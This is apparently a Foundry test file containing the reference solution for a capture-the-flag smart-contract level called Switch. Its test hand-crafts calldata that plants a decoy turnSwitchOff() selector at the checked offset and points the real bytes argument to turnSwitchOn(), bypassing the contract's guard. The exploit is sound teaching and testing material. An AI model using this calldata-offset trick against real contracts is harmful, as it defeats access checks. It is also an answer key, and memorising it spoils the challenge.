// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {SwitchFactory} from "../../src/levels/SwitchFactory.sol";
import {Switch} from "../../src/levels/Switch.sol";

contract SwitchLevel is LuxTest {
    SwitchFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new SwitchFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0);
        _assertUnsolved(instance, player);

        // Craft calldata so the byte at offset 68 is turnSwitchOff() (passing
        // onlyOff) while the real bytes payload, pointed past the decoy, is
        // turnSwitchOn().
        bytes memory payload = abi.encodePacked(
            bytes4(0x30c13ade), // flipSwitch(bytes)
            uint256(0x60), // offset to the bytes arg
            uint256(0), // filler
            bytes4(0x20606e15), bytes28(0), // offset 68: turnSwitchOff() decoy
            uint256(4), // real data length
            bytes4(0x76227e12), bytes28(0) // turnSwitchOn()
        );
        vm.prank(player, player);
        (bool ok,) = instance.call(payload);
        require(ok, "flipSwitch failed");

        assertTrue(Switch(instance).switchOn());
        _assertSolved(factory, instance, player);
    }
}
